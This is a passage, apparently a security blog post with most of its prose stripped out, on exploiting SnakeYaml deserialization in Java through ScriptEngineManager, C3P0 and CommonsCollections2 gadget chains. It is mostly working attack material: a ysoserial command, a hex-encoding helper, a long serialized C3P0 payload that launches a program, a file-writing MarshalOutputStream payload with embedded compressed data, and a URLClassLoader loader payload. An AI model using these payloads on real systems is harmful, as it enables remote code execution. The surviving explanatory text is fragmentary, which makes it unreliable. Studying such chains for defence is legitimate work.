 getClassForNode  this.typeTags nullif
 getClassForName  ScriptEngineManager Class
 typeTags Mapputtagclass ScriptEngineManager
class URLClassLoader  URL 
 URL class construct 
 node  type 
 newInstance 3 URL 
 URLClassLoader  ScriptEngineManager 
Fastjsonpayload
tagnodetypeSnakeYaml !!  tag 
 ScriptEngineManager  URLClassLoader  URL class
 construct  URL  URLClassLoader  ScriptEngineManager 
SPI 
 ScriptEngineManager 
SPI ScriptEngineManager SPI
SPI  Service Provider Interface ClassPath
 META-INF/services 
 SPI Java classpath  META-INF/services/  
lombok
poc
JDBC
 java.util.ServiceLoder  META-INF/services 
 Class.forName , newInstance() ,
ScriptEngineManager 
 ScriptEngineManager payloadjar
 ScriptEngineManager  newInstance F7
 initEngines
ServiceLoaderSPI META-INF/services 
javax.script.ScriptEngineFactory PoC
 itr.next()  ServiceLoader$LazyIterator#next()  nextService
classnewInstance,
 NashornScriptEngineFactory jarPoC
/
mi1k7eaJNDI
C3P0 
FastjsonC3P0
 C3P0.WrapperConnectionPoolDataSource Hex
userOverridesAsString GadgetHex
C3P0+CC2
CC2PoC
âžœ java -jar ysoserial.jar CommonsCollections2 "open -a Calculator" > /tmp/calc.s
er
Hex
public class HexEncode {
    public static void main(String[] args) throws IOException, ClassNotFoundExce
ption {
        System.out.println("hello");
        InputStream in = new FileInputStream("/tmp/calc.ser");
        byte[] data = toByteArray(in);
        in.close();
        String HexString = bytesToHexString(data, data.length);
        System.out.println(HexString);
    }
    public static byte[] toByteArray(InputStream in) throws IOException {
        byte[] classBytes;
        classBytes = new byte[in.available()];
        in.read(classBytes);
        in.close();
        return classBytes;
    }
    public static String bytesToHexString(byte[] bArray, int length) {
        StringBuffer sb = new StringBuffer(length);
        for(int i = 0; i < length; ++i) {
            String sTemp = Integer.toHexString(255 & bArray[i]);
            if (sTemp.length() < 2) {
                sb.append(0);
            }
            sb.append(sTemp.toUpperCase());
        }
        return sb.toString();
    }
}
SnakeYaml Payload
!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource
userOverridesAsString: 'HexAsciiSerializedMap:ACED0005737200176A6176612E7574696C
2E5072696F72697479517565756594DA30B4FB3F82B103000249000473697A654C000A636F6D7061
7261746F727400164C6A6176612F7574696C2F436F6D70617261746F723B78700000000273720042
6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E73342E636F6D7061726174
6F72732E5472616E73666F726D696E67436F6D70617261746F722FF984F02BB108CC0200024C0009
6465636F726174656471007E00014C000B7472616E73666F726D657274002D4C6F72672F61706163
68652F636F6D6D6F6E732F636F6C6C656374696F6E73342F5472616E73666F726D65723B78707372
00406F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E73342E636F6D706172
61746F72732E436F6D70617261626C65436F6D70617261746F72FBF49925B86EB137020000787073
72003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E73342E66756E6374
6F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267
737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D65740012
4C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176
612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE
589F1073296C02000078700000000074000E6E65775472616E73666F726D6572757200125B4C6A61
76612E6C616E672E436C6173733BAB16D7AECBCD5A99020000787000000000770400000003737200
3A636F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E7465726E616C2E78736C7463
2E747261782E54656D706C61746573496D706C09574FC16EACAB3303000649000D5F696E64656E74
4E756D62657249000E5F7472616E736C6574496E6465785B000A5F62797465636F6465737400035B
5B425B00065F636C61737371007E000B4C00055F6E616D6571007E000A4C00115F6F757470757450
726F706572746965737400164C6A6176612F7574696C2F50726F706572746965733B787000000000
FFFFFFFF757200035B5B424BFD19156767DB37020000787000000002757200025B42ACF317F80608
54E00200007870000006A8CAFEBABE0000003200390A000300220700370700250700260100107365
7269616C56657273696F6E5549440100014A01000D436F6E7374616E7456616C756505AD2093F391
DDEF3E0100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461
626C650100124C6F63616C5661726961626C655461626C6501000474686973010013537475625472
616E736C65745061796C6F616401000C496E6E6572436C61737365730100354C79736F7365726961
6C2F7061796C6F6164732F7574696C2F4761646765747324537475625472616E736C65745061796C
6F61643B0100097472616E73666F726D010072284C636F6D2F73756E2F6F72672F6170616368652F
78616C616E2F696E7465726E616C2F78736C74632F444F4D3B5B4C636F6D2F73756E2F6F72672F61
70616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174
696F6E48616E646C65723B2956010008646F63756D656E7401002D4C636F6D2F73756E2F6F72672F
6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B01000868616E646C
6572730100425B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F
73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B01000A4578636570
74696F6E730700270100A6284C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E
7465726E616C2F78736C74632F444F4D3B4C636F6D2F73756E2F6F72672F6170616368652F786D6C
2F696E7465726E616C2F64746D2F44544D417869734974657261746F723B4C636F6D2F73756E2F6F
72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C
697A6174696F6E48616E646C65723B29560100086974657261746F720100354C636F6D2F73756E2F
6F72672F6170616368652F786D6C2F696E7465726E616C2F64746D2F44544D417869734974657261
746F723B01000768616E646C65720100414C636F6D2F73756E2F6F72672F6170616368652F786D6C
2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65
723B01000A536F7572636546696C6501000C476164676574732E6A6176610C000A000B0700280100
3379736F73657269616C2F7061796C6F6164732F7574696C2F476164676574732453747562547261
6E736C65745061796C6F6164010040636F6D2F73756E2F6F72672F6170616368652F78616C616E2F
696E7465726E616C2F78736C74632F72756E74696D652F41627374726163745472616E736C657401
00146A6176612F696F2F53657269616C697A61626C65010039636F6D2F73756E2F6F72672F617061
6368652F78616C616E2F696E7465726E616C2F78736C74632F5472616E736C657445786365707469
6F6E01001F79736F73657269616C2F7061796C6F6164732F7574696C2F476164676574730100083C
636C696E69743E0100116A6176612F6C616E672F52756E74696D6507002A01000A67657452756E74
696D6501001528294C6A6176612F6C616E672F52756E74696D653B0C002C002D0A002B002E010012
6F70656E202D612043616C63756C61746F7208003001000465786563010027284C6A6176612F6C61
6E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B0C003200330A002B0034
01000D537461636B4D61705461626C6501001E79736F73657269616C2F50776E6572333437323131
3439383436393232330100204C79736F73657269616C2F50776E6572333437323131343938343639
3232333B002100020003000100040001001A000500060001000700000002000800040001000A000B
0001000C0000002F00010001000000052AB70001B100000002000D0000000600010000002F000E00
00000C000100000005000F003800000001001300140002000C0000003F0000000300000001B10000
0002000D00000006000100000034000E00000020000300000001000F003800000000000100150016
0001000000010017001800020019000000040001001A00010013001B0002000C0000004900000004
00000001B100000002000D00000006000100000038000E0000002A000400000001000F0038000000
00000100150016000100000001001C001D000200000001001E001F00030019000000040001001A00
080029000B0001000C00000024000300020000000FA70003014CB8002F1231B6003557B100000001
0036000000030001030002002000000002002100110000000A000100020023001000097571007E00
18000001D4CAFEBABE00000032001B0A0003001507001707001807001901001073657269616C5665
7273696F6E5549440100014A01000D436F6E7374616E7456616C75650571E669EE3C6D4718010006
3C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C65010012
4C6F63616C5661726961626C655461626C6501000474686973010003466F6F01000C496E6E657243
6C61737365730100254C79736F73657269616C2F7061796C6F6164732F7574696C2F476164676574
7324466F6F3B01000A536F7572636546696C6501000C476164676574732E6A6176610C000A000B07
001A01002379736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324466F6F
0100106A6176612F6C616E672F4F626A6563740100146A6176612F696F2F53657269616C697A6162
6C6501001F79736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747300210002
0003000100040001001A000500060001000700000002000800010001000A000B0001000C0000002F
00010001000000052AB70001B100000002000D0000000600010000003C000E0000000C0001000000
05000F001200000002001300000002001400110000000A000100020016001000097074000450776E
727077010078737200116A6176612E6C616E672E496E746567657212E2A0A4F78187380200014900
0576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000
00000178;'
ScriptEngineManager 
 https://xz.aliyun.com/t/10655,
jar ScriptEngineManager file
jar
PoC:
!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!ja
va.io.FileOutputStream [!!java.io.File ["/tmp/yaml-payload.txt"],false],!!java.u
til.zip.Inflater  { input: !!binary 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
bw07iAcA6JGGwQ== },1048576]]
RCE
PoC
!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["
file:///tmp/yaml-payload.txt"]]]]
ruoyijar
jpgpngtxt
C3P0C3P0
Gadget ScriptEngineManager 
Reference 
https://xz.aliyun.com/t/10655
https://www.mi1k7ea.com/2019/11/29/Java-
SnakeYaml%25E5%258F%258D%25E5%25BA%258F%25E5%2588%2597%25E5%258C%259
6%25E6%25BC%258F%25E6%25B4%259E/#0x03-
%25E6%259B%25B4%25E5%25A4%259AGadgets%25E6%258E%25A2%25E7%25A9%25B6
https://github.com/artsploit/yaml-payload
https://b1ue.cn/archives/407.html
https://www.cnblogs.com/nice0e3/p/14514882.html